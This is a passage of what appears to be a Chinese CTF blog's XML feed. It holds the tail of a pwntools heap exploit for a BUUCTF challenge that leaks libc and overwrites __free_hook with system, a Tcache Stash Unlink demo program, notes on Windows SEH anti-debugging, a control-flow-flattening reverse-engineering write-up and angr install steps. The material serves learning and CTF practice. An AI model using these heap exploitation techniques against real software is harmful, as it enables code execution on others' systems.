class="string">b&quot;/bin/sh\x00&quot;</span> * (<span class="number">0x70</span> // <span class="number">0x8</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:    &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 2</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)   <span class="comment"># 3</span></span><br><span class="line">    __free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(__free_hook - <span class="number">0x10</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">&quot;Y&quot;</span>, payload)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">&quot;N&quot;</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, sex, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_add))</span><br><span class="line">    sa(<span class="string">&quot;input name&quot;</span>, name)</span><br><span class="line">    sa(<span class="string">&quot;input sex&quot;</span>, sex)</span><br><span class="line">    sa(<span class="string">&quot;input information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, flag, content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Are you sure change sex?&quot;</span>, flag)</span><br><span class="line">    sa(<span class="string">&quot;Now change information&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Give me your choice :&quot;</span>, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;Give me your index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set $base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo 演示</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="实例源码演示"><a href="#实例源码演示" class="headerlink" title="实例源码演示"></a>实例源码演示</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> *smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;使用此攻击手法您可以实现向任意地址写入一个大数\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.首先申请六块0x60大小的chunk，然后全部free掉使之进入tcahce bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;六块进入tcache的chunk地址为%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * <span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.在smallbin中制造出两块同样大小的chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请的一个超过tcachebin大小范围的chunk:%p,同时申请一个chunk防止此chunk free后与top chunk合并\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请一个chunk使得剩下的chunk的大小正好为0x70,随后再申请一个大于unsorted bin中的chunk,使得剩下的0x70大小的chunk进入small bin中\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此时smallbin中已经有一个chunk:%p,再来用同样的方法来构造一个\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small bin中的chunk为 %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后进入的chunk的bk为target-0x10,随后用calloc申请一个chunk,触发stash机制,完成对于向目标写入大数的攻击,达成了和unsorted bin attack同样的效果\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标:%p,值:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>直接定位到最后一步在gdb中跟踪一下</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>结构化异常处理（SEH）是Windows操作系统提供的强大异常处理功能。而Visual C++中的__<em>try{}/\</em>_finally{}和__try{}/__except{}结构本质上是对Windows提供的SEH的封装。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>线程信息块TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//异常的链表</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  <strong>Fs:[0]总是指向当前线程的TIB，其中0偏移的指向线程的异常链表，即ExceptionList是指向异常处理链表（EXCEPTION_REGISTRATION结构）的一个指针。</strong></p><p>EXCEPTION_REGISTRATION结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//指向前一个EXCEPTION_REGISTRATION的指针</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>加入SEH的代码（没加SEH代码去掉try和except结构即可）</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有SEH的反汇编</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>查看加入SEH代码后的反汇编</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>真正的代码在xref后面</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>可以通过od改eip的值绕过异常代码</p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><p>可用于反调试，代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// 记录了一些异常信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// 寄存器环境</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// 如果为1表示被调试</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混淆技术-控制流平坦化 [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
        <content type="html"><![CDATA[<h2 id="去除平坦化"><a href="#去除平坦化" class="headerlink" title="去除平坦化"></a>去除平坦化</h2><p>给了elf文件，一开始缺libc库，先下载下来<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>然后运行程序，输入flag然后没了<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>载入ida，发现主函数比较复杂，查看控制流程图(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>根据流程图发现是控制流平坦化混淆技术，利用符号执行来去除平坦化：<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>在ida中找到main函数地址，然后deflat.py一把梭<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>拿到去除平坦化后的文件，载入ida，舒服了<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>发现主函数一堆分支围绕x和y来展开<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>x和y都是bss段上的变量，整个函数中也没有对齐赋值，所以都是没啥用的代码<br>真正有用的代码逻辑在后面的while循环中</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>这些函数我都给重新命名了，其中的一些函数很简单，另外一些函数做了混淆处理，我们进入一个比较复杂的函数来查看<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>很混乱，不知道是干啥的</p><p>仔细分析一下就会发现我们只关心局部变量v16的值<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>所以大胆推测这个函数虽然这么多代码，但是有效的代码就执行了一个逻辑，将传入的两个参数相加并返回，保险起见我们可以动态调试验证一下，下断点为0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>函数调用前：<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>调用后：<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>发现执行完这个函数后rax的值果然变为了0x38<br>后面几个函数大概也是这个逻辑</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>main函数执行完这一系列函数后，和enc这个表中的字符作对比，要保证我们输入的21个字符都和表中相等，通过这一连串的处理函数，我们总结表达式如下(前面记录了两个时间差，预期肯定是让时间差是0)：<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>注意，一开始程序给了一串md5作为flag[0]，是”#”<br>所以这个表达式中惟一的未知量就是flag[i]<br>两边做变形处理，得<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>最终decode代码如下:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 去除控制流平坦化的工具deflat.py安装</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="在virtualenv中安装angr"><a href="#在virtualenv中安装angr" class="headerlink" title="在virtualenv中安装angr"></a>在virtualenv中安装angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>在.zshrc中添加(或.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ～/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>保存后执行<code>source ～/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3打开终端，import angr测试发现安装成功</p><h2 id="安装deflat-py"><a href="#安装deflat-py" class="headerlink" title="安装deflat.py"></a>安装deflat.py</h2><p>github地址如下</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverse题解2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
